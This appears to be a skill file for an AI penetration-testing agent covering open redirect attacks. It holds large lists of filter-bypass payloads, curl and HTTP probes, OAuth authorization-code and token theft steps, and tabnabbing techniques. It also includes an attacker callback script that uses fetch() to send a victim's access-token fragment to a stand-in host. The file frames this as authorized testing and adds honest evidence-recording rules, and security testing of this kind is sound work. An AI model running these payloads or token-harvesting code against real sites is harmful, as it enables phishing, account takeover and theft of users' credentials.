---
name: open-redirect
description: "Open redirect exploitation for OAuth token theft, phishing, and filter bypass techniques"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, followRedirects, evaluateRendered, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["open redirect", "url redirect", "redirect vulnerability", "open url redirect", "redirect injection", "oauth redirect", "phishing redirect", "url validation bypass", "302 redirect", "location header redirect"]
contextBoosts: [auth]
mitreAttack: ["T1189", "T1566"]
owaspRefs: ["OWASP Top 10 A01:2021 Broken Access Control"]
---

# Open Redirect Exploitation

## When to Use

Use this skill when the target application:
- Accepts user-controlled URLs for server-side or client-side redirects
- Has OAuth/SAML flows with callback or redirect_uri parameters
- Implements login, logout, or post-action redirect logic using query parameters
- Uses JavaScript-based or meta-refresh redirect mechanisms
- Has URL validation that can be bypassed via encoding, path tricks, or DNS variations

## Do Not Use

- When the application does not accept external URLs for redirection
- When redirect targets are hardcoded with no user input
- When a WAF or CDN strictly validates redirect destinations server-side
- When testing would cause account lockout or data loss on production systems without authorization

## Auth Context

Open redirects are most dangerous when chained with authentication flows:
- **OAuth/SAML**: Steal authorization codes or tokens during the callback phase
- **Password reset**: Redirect the reset link to an attacker-controlled page
- **Post-login redirect**: Phish credentials immediately after legitimate authentication
- **SSO transitions**: Intercept tokens during identity provider handoffs

Require authenticated session context (`contextBoosts: [auth]`) for full impact exploitation.

## Detection

### Parameter Enumeration

Test every redirect parameter systematically. Common parameter names:

```
?redirect=        ?redirect_uri=      ?redirect_url=     ?return=
?returnTo=        ?return_to=         ?returnUrl=        ?next=
?goto=            ?go=                ?url=              ?dest=
?destination=     ?rurl=              ?r=                ?u=
?continue=        ?callback=          ?forward=          ?link=
?target=          ?to=                ?out=              ?view=
```

### Detection Method

1. **Inject external URL** into each parameter: `https://evil.com`
2. **Observe response**: Check for 3xx status + `Location` header pointing to attacker domain
3. **Check JavaScript redirects**: Look for `window.location`, `document.location`, `location.href` assignments in response body
4. **Check meta refresh**: Look for `<meta http-equiv="refresh" content="0;url=...">` tags
5. **Follow the redirect**: Confirm the browser actually navigates to the external domain

### Evidence to Record

- HTTP request with injected redirect URL
- Full response headers (especially `Location`)
- Response body if JavaScript or meta redirect is used
- Browser behavior after following the redirect chain

## Basic Exploitation

### Server-Side Redirect (HTTP 3xx)

```http
GET /login?next=https://evil.com HTTP/1.1
Host: target.com

```

Expected response:

```http
HTTP/1.1 302 Found
Location: https://evil.com
```

```bash
# Confirm without following the redirect first
curl -sk -D - -o /dev/null "https://target.com/login?next=https://evil.com" | grep -i location
```

### Client-Side Redirect (JavaScript)

Response body contains:

```html
<script>
window.location = "https://evil.com";
// or: document.location.href = "..."; window.location.assign(...); location.replace(...)
</script>
```

### Meta Refresh Redirect

```html
<meta http-equiv="refresh" content="0;url=https://evil.com">
```

```bash
# Detect meta-refresh redirects in the response body
curl -sk "https://target.com/redirect?url=https://evil.com" | grep -i 'http-equiv="refresh"'
```

## Filter Bypass Techniques

### Protocol-Relative Redirect

If the application strips `https://` but not `//`:

```
//evil.com
//evil.com/path
////evil.com
```

```http
GET /login?next=//evil.com HTTP/1.1
Host: target.com

```

Browser resolves `//evil.com` as `https://evil.com`.

### Subdomain Impersonation

```
https://target.com.evil.com/
https://evil-target.com/           # prefix match on "target"
https://target-com/                # dash confusion
https://target.com%2fevil.com/
```

Some validations only check if the domain ends with `target.com`. Use attacker-controlled subdomain or DNS to resolve.

### Path Traversal with @ (Authority Confusion)

```
https://target.com@evil.com/
https://target.com:secret@evil.com/
```

Parsed as: user `target.com`, host `evil.com`. Some URL parsers misinterpret this.

### Backslash Authority Confusion

```
https://target.com/\/evil.com
https:\\evil.com
/\//evil.com
/\evil.com
```

Some URL parsers treat backslash as a path separator, causing the authority to shift to `evil.com`.

```http
GET /login?next=https://target.com%5c%5cevil.com HTTP/1.1

<!-- Browsers (notably Chrome) normalize \ to / in the authority position → //evil.com -->
```

### URL Encoding

Encode the `//` prefix to bypass string-based filters:

```
%2f%2fevil.com
https:%2f%2fevil.com
https%3a%2f%2fevil.com
/%2fevil.com
```

### Double URL Encoding

Encode the `%` character itself:

```
%252f%252fevil.com        # %252f -> %2f -> /
https:%252f%252fevil.com
%25252f%25252fevil.com    # triple, for double-decoding stacks
```

### Backslash Path Traversal

```
https://target.com\evil.com
/..\//evil.com
//\evil.com
```

On some systems, backslash is treated as a path separator, redirecting to `evil.com`.

### Null Byte Injection

```
https://evil.com%00
https://evil.com%00.target.com
https://evil.com?x=%00
```

Older parsers may truncate at the null byte, treating the rest as invalid.

### DNS Name Variations

```
https://evil.com.                       # trailing dot — same host to resolvers
https://0x7f000001/                     # hex IP form (if redirecting internally)
https://2130706433/                     # decimal IP form
https://evil.co.uk@evil.com/
https://ⓔⓥⓘⓛ.com/                      # unicode circled letters normalize to "evil"
```

### Parameter Pollution

Send the same parameter twice with different values:

```
?next=https://target.com&next=https://evil.com
?next=whitelist&next=https://evil.com
?next[]=safe&next[]=//evil.com
```

Server may use the first value for validation and the last for the redirect.

### Tab and Newline Characters

```
https://ev%09il.com          # tab inside domain
https://evil.com%0a
https://evil.com%0dhttps://target.com
java%0ascript:alert(1)
```

Some parsers ignore whitespace characters in the URL.

### Unicode and Special Characters

```
https://evil.com%E3%80%82            # ideographic full stop (。)
https://％２ｆ％２fevil.com           # fullwidth percent/slash
https://evil.com／                    # fullwidth solidus U+FF0F
hTTps://Evil.COM/                     # scheme/host case confusion
```

Unicode normalization or homograph attacks can confuse domain validation.

## OAuth Token Theft

### Attack Flow

1. **Identify OAuth callback URL**: Find `redirect_uri`, `callback`, `return_to` in OAuth flow
2. **Craft malicious redirect**: Set `redirect_uri=https://evil.com/callback`
3. **Wait for victim**: Victim clicks crafted link, authenticates with OAuth provider
4. **Steal authorization code**: OAuth provider redirects to attacker domain with `?code=AUTHORIZATION_CODE`
5. **Exchange code for token**: Attacker exchanges stolen code for access token

### Exploitation Steps

```http
# Step 1: Discover the OAuth flow and its callback parameter
GET /auth/start?client_id=abc&redirect_uri=https://target.com/callback HTTP/1.1

# Step 2: Substitute an attacker-controlled redirect_uri
GET /oauth/authorize?client_id=abc&response_type=code&redirect_uri=https://evil.com/callback HTTP/1.1

# Step 3: Victim authenticates; provider redirects the code to the attacker
HTTP/1.1 302 Found
Location: https://evil.com/callback?code=AUTHORIZATION_CODE
```

```bash
# Enumerate redirect_uri validation: try subpaths, subdomains, encodings
for uri in "https://evil.com" "https://target.com.evil.com" "https://target.com@evil.com" \
           "https://target.com/callback/../../evil" "//evil.com" "https://evil.com%2ftarget"; do
  echo -n "$uri -> "
  curl -sk -o /dev/null -w "%{http_code}\n" \
    "https://provider.com/oauth/authorize?client_id=abc&response_type=code&redirect_uri=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$uri")"
done
```

### OAuth Provider Variations

```http
# Authorization Code Flow — steal the code from the query string
Location: https://evil.com/callback?code=AUTH_CODE&state=xyz

# Implicit Flow — token in the fragment (never sent to servers, read by JS)
Location: https://evil.com/callback#access_token=AT-1234&token_type=bearer
```

```html
<!-- Attacker callback page harvesting the implicit-flow fragment -->
<script>
if (location.hash) {
  fetch('https://attacker.com/log?fragment=' + encodeURIComponent(location.hash));
}
</script>
```

- **Authorization Code Flow**: Steal `code` parameter from callback
- **Implicit Flow**: Steal `access_token` from URL fragment (`#access_token=...`)
- **PKCE Bypass**: If `code_verifier` is not bound to `code_challenge`, intercept and reuse

### Impact Amplification

- Chain with phishing: Redirect to login page clone, then steal tokens
- Chain with session fixation: Set session cookie before redirect, hijack after login
- Chain with SSRF: Use stolen token to access internal APIs

## Tabnabbing (Reverse Tabnabbing)

### Attack Mechanism

When a page opens a link with `target="_blank"` and `rel="opener"` (or no `rel`), the opened page can navigate the opener via `window.opener.location`.

### Exploitation

1. **Find outbound links** with `target="_blank"` and no `rel="noopener noreferrer"`
2. **Host attacker page** that performs: `window.opener.location = 'https://evil.com/phishing'`
3. **Victim clicks link** → attacker page loads → original tab silently redirects to phishing page

### Detection

Search response HTML for:

```html
<!-- VULNERABLE: no rel protection -->
<a href="https://third-party.com" target="_blank">Partner</a>

<!-- SAFE -->
<a href="https://third-party.com" target="_blank" rel="noopener noreferrer">Partner</a>
```

```bash
curl -sk https://target.com | grep -oE '<a [^>]*target="_blank"[^>]*>' | grep -v noopener
```

Missing `noopener` or `noreferrer` in `rel` attribute is vulnerable.

### Impact

Victim returns to the original tab expecting a legitimate site but sees a phishing clone. Particularly effective against:
- OAuth login pages
- Banking and email portals
- SSO authentication flows

## JavaScript-Based Redirects

### Common Patterns

```html
<script>
window.location = "https://evil.com";
window.location.href = "https://evil.com";
window.location.assign("https://evil.com");
window.location.replace("https://evil.com");   // breaks back button
document.location = "//evil.com";
window.open("https://evil.com", "_self");
</script>
```

```html
<!-- DOM-based: user input flows into the sink -->
<script>
var url = new URLSearchParams(location.search).get('next');
if (url) location = url;
</script>
```

### Meta Refresh

```html
<meta http-equiv="refresh" content="0;url=//evil.com">
<meta http-equiv="refresh" content="5;url=https://evil.com/phish">
```

### Evaluation in Sandboxed Contexts

Use `evaluateRendered` to observe actual browser behavior after JavaScript execution. Static HTML analysis alone may miss runtime redirects.

## Impact Documentation

### Severity Classification

- **High**: OAuth token theft, credential phishing via post-login redirect
- **Medium**: General phishing, session fixation chaining
- **Low**: Open redirect without authentication context (limited direct impact)

### Attack Scenarios to Document

1. **Credential Theft**: Phishing page captures username and password
2. **OAuth Abuse**: Stolen authorization code grants account access
3. **Malware Distribution**: Redirect to drive-by download page
4. **Session Hijacking**: Chain with session fixation for account takeover
5. **SSRF Chaining**: Redirect to internal network endpoints

## Anti-Hallucination

- **Verify every redirect**: Use `followRedirects` and confirm the browser navigates to the injected domain
- **Record HTTP evidence**: Capture full request/response including headers before claiming a redirect exists
- **Do not assume**: A parameter being present does not mean it is vulnerable — test with external URLs
- **Distinguish client vs server redirect**: Server-side (3xx headers) vs client-side (JavaScript/meta) have different exploitation paths
- **Check for DOM-based sinks**: Use `evaluateRendered` to confirm JavaScript actually executes the redirect
- **Do not fabricate bypass results**: If a filter blocks your payload, report it as filtered — do not claim success
- **Log failed attempts**: Record which bypasses were blocked to help refine the filter analysis

## Trigger Conditions

Activate when the application accepts user-controlled URLs for redirection — `redirect`, `return`, `next`, `url`, `to`, `continue` params, post-login/ logout/action redirects, OAuth/SAML `redirect_uri`/`callback`, `window.location`/meta-refresh in responses, or JavaScript-based navigation. Also trigger for tabnabbing (links with `target="_blank"` lacking `rel="noopener"`). Do not trigger when redirect targets are hardcoded with no user input, or filters strictly validate destinations server-side.

## Detection Approach

Enumerate every redirect-bearing parameter and inject an external URL (`https://evil.com`), then check for a 3xx `Location` to the attacker domain, a JS `window.location` assignment, or a meta-refresh. Follow the redirect (`followRedirects`) and confirm the browser actually lands on the external domain. If a naive payload is filtered, escalate through bypass families: protocol-relative `//evil.com`, subdomain suffix matching (`evil-target.com`), `@`/backslash authority confusion, URL/percent/double encoding, parameter pollution (first validated, last used), and unicode/homograph tricks. For OAuth, set a malicious `redirect_uri` and confirm the provider returns the code/token to your host. Confirm the impact context (authenticated vs anonymous) before rating severity.

## Pitfalls

- Assuming a parameter is vulnerable just because it exists — test with an external URL and observe the actual navigation.
- Treating a filtered payload as success — report it as blocked honestly.
- Conflating server-side (3xx) vs client-side (JS/meta) redirects — different exploitation paths.
- Claiming OAuth token theft without confirming the provider honors the malicious `redirect_uri`.
- Missing DOM-based redirects that only appear at runtime — use `evaluateRendered`, not static HTML alone.
- Overrating impact of an anonymous open redirect with no auth/phishing chain.

## Verification & Impact

CONFIRMED when the browser navigates to the attacker-controlled domain (verified via `followRedirects` + response `Location`/body), or a victim's OAuth code/token is delivered to the attacker host. SUSPECTED when a redirect param exists but navigation to evil isn't reproduced — record as candidate. Document impact by the chain enabled: OAuth/code/token theft (High), credential phishing via post-login redirect, session fixation, tabnabbing, SSRF chaining, or standalone phishing (Medium/Low). Capture the request, redirect response, and followed destination via `recordEvidence`.
